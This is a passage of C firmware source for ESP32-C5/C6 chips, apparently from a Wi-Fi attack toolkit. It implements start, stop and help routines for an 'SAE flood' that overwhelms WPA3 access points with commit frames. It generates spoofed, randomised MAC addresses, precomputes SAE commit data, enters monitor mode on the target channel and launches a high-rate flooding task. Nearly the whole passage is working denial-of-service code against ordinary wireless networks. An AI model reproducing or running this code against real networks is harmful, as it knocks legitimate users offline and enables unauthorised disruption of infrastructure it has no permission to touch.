        uint8_t base_mac_build[6];
        esp_wifi_get_mac(WIFI_IF_STA, base_mac_build);
        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
            uint32_t r = esp_random();
            memcpy(sae_mac_pool[i], base_mac_build, 6);
            sae_mac_pool[i][0] |= 0x02;
            sae_mac_pool[i][0] &= 0xFE;
            sae_mac_pool[i][4] = (r >> 8) & 0xFF;
            sae_mac_pool[i][5] = r & 0xFF;
            sae_seq_counters[i] = (uint16_t)(esp_random() & 0x0FFF);
            sae_precompute_attempted[i] = false;
            sae_commit_cache_ready[i] = false;
        }
        sae_mac_pool_ready = true;
    }

    // Precompute commit data
    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
    if (pwd && strlen(pwd) > 0) {
        if (!sae_crypto_initialized) {
            mbedtls_ecp_point_init(&sae_tmp_point);
            sae_crypto_initialized = true;
        }
        if (!sae_initialized) {
            mbedtls_ecp_group_init(&sae_ctx.group);
            mbedtls_ecp_point_init(&sae_ctx.pwe);
            mbedtls_ecp_point_init(&sae_ctx.own_element);
            mbedtls_ecp_point_init(&sae_ctx.peer_element);
            mbedtls_mpi_init(&sae_ctx.own_scalar);
            mbedtls_mpi_init(&sae_ctx.peer_scalar);
            mbedtls_mpi_init(&sae_ctx.rand);
            mbedtls_mpi_init(&sae_ctx.mask);
            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
                // Skip precompute on error
            } else {
                int precomputed = 0;
                for (int i = 0; i < SAE_MAC_POOL_SIZE && precomputed < SAE_PRECOMPUTE_LIMIT; ++i) {
                    if (sae_precompute_attempted[i]) continue;
                    sae_precompute_attempted[i] = true;
                    if (sae_derive_pwe(pwd, sae_mac_pool[i], sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group) == ESP_OK) {
                        if (sae_generate_commit(&sae_ctx) == ESP_OK) {
                            uint8_t element_buf[33];
                            size_t elen = 0;
                            if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                                               MBEDTLS_ECP_PF_COMPRESSED, &elen,
                                                               element_buf, sizeof(element_buf)) == 0 && elen == 33) {
                                memcpy(sae_commit_element_cache[i], element_buf, 33);
                                mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
                                sae_commit_cache_ready[i] = true;
                                precomputed++;
                            }
                        }
                    } else {
                        sae_pwe_failures++;
                    }
                }
            }
            sae_initialized = true;
        }
    }

    wifi_manager_start_monitor_mode(sae_monitor_callback);
    esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);

    BaseType_t attack_rc = xTaskCreate_psram(sae_flood_task, "sae_flood_task", 3072, NULL, 5, &sae_flood_task_handle);
    BaseType_t display_rc = xTaskCreate_psram(sae_flood_display_task, "sae_displ", 2048, NULL, 3, &sae_flood_display_task_handle);
    if (attack_rc != pdPASS || display_rc != pdPASS) {
        glog("SAE flood failed to start tasks (attack=%ld, display=%ld)\n", (long)attack_rc, (long)display_rc);
        sae_flood_running = false;
        if (sae_flood_task_handle != NULL) {
            vTaskDeleteWithCaps(sae_flood_task_handle);
            sae_flood_task_handle = NULL;
        }
        if (sae_flood_display_task_handle != NULL) {
            vTaskDeleteWithCaps(sae_flood_display_task_handle);
            sae_flood_display_task_handle = NULL;
        }
        wifi_manager_stop_monitor_mode();
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_status("SAE start failed");
#endif
        return;
    }

    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
             sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
             sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);

    glog("SAE flood attack started against %s (%s) on channel %d\n", 
         selected_ap.ssid, bssid_str, sae_target_channel);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("SAE flood", "running");
#endif
}

void sae_flood_stop(void) {
    if (!sae_flood_running) {
        return;
    }

    sae_flood_running = false;
    
    int wait_count = 0;
    while ((sae_flood_task_handle != NULL || sae_flood_display_task_handle != NULL) && wait_count < 30) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait_count++;
    }

    if (sae_flood_task_handle != NULL) {
        vTaskDeleteWithCaps(sae_flood_task_handle);
        sae_flood_task_handle = NULL;
    }
    if (sae_flood_display_task_handle != NULL) {
        vTaskDeleteWithCaps(sae_flood_display_task_handle);
        sae_flood_display_task_handle = NULL;
    }
    
    wifi_manager_stop_monitor_mode();
    if (sae_initialized) {
        mbedtls_ecp_group_free(&sae_ctx.group);
        mbedtls_ecp_point_free(&sae_ctx.pwe);
        mbedtls_ecp_point_free(&sae_ctx.peer_element);
        mbedtls_ecp_point_free(&sae_ctx.own_element);
        mbedtls_mpi_free(&sae_ctx.peer_scalar);
        mbedtls_mpi_free(&sae_ctx.own_scalar);
        mbedtls_mpi_free(&sae_ctx.rand);
        mbedtls_mpi_free(&sae_ctx.mask);
        memset(&sae_ctx, 0, sizeof(sae_ctx));
        sae_initialized = false;
    }
    if (sae_crypto_initialized) {
        mbedtls_ecp_point_free(&sae_tmp_point);
        sae_crypto_initialized = false;
    }
    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
    sae_mac_pool_ready = false;
    sae_heap_free();
    glog("SAE-Flood stopped. Total: %d packets\n", sae_flood_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("SAE stopped");
#endif
}

void sae_flood_help(void) {
    glog("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
    glog("Rate: 100+ frames/sec with randomization\n");
    glog("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
    glog("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
    glog("Commands: saeflood, stopsaeflood, saefloodhelp\n");
}

bool sae_flood_is_running(void) {
    return sae_flood_running;
}

#else // !(CONFIG_IDF_TARGET_ESP32C5 || CONFIG_IDF_TARGET_ESP32C6)

void sae_flood_start(const char *password) {
    (void)password;
    glog("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
}

void sae_flood_stop(void) {
}

void sae_flood_help(void) {
    glog("SAE Flood Attack - Only supported on ESP32-C5/C6\n");
    glog("Commands: saeflood, stopsaeflood, saefloodhelp\n");
}

bool sae_flood_is_running(void) {
    return false;
}

#endif // CONFIG_IDF_TARGET_ESP32C5 || CONFIG_IDF_TARGET_ESP32C6
